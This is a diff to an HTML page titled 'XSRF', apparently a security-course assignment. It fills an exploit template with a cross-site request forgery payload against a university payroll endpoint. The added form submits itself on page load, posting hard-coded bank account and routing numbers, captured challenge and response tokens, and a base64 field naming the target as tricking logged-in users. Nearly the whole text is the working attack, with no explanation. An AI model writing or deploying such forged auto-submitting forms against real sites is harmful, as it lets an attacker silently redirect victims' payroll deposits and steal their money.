@@ -5,10 +5,19 @@
     <title>XSRF</title>
 </head>
 
+
 <body onload="document.forms[0].submit()">
-    <form action="" onsubmit="" method="POST">
-        <!--Your exploits here You may also want to change some form attributes-->
+    <form action="http://payroll.gatech.edu/account.php?" method="POST">
+        <input id="account" type="number" name="account" value="3598778852">
+        <input id="route" type="number" name="routing" value="3873125047">
+        <input id="csrfc" type="hidden" name="challenge" value="1073500972"> <!--This is variable per login.-->
+        <input id="csrfr" type="hidden" name="response" value="52724">
+        <input id="varId" type="hidden" name="varId" value="42">
+        <input type="hidden" name="VGFyZ2V0MUZhbGwyMDIwLVRyaWNrTG9nZ2VkSW5Vc2Vycw" value="VGFyZ2V0MUZhbGwyMDIwLVRyaWNrTG9nZ2VkSW5Vc2Vycw">
+        <input type="hidden" name="action" value="save">Save</button>
+        <!--file:///home/debian/user/t1.html-->
     </form>
+
 </body>
 
 </html>
